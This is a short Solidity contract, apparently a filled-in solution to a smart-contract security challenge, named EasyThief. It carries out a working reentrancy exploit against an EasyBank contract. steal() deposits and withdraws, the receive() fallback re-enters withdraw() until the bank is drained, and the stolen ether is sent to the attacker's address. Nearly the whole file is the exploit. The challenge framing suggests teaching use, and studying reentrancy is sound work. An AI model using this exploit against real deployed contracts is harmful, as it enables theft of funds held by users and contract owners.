//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

import "hardhat/console.sol";

import "./EasyBank.sol";

contract EasyThief {
    address thief;
    EasyBank bank;

    constructor(address bankAddress) {
        thief = msg.sender;
        bank = EasyBank(bankAddress);
    }

    //
    // CHALLENGE: IMPLEMENT PART OF THE EXPLOIT HERE
    //
    receive() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }

    //
    // CHALLENGE: THIS IS CALLED FIRST TO START THE STEAL
    //
    function steal() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();

        (bool success, ) = thief.call{value: address(this).balance}("");
        require(success);
    }
}
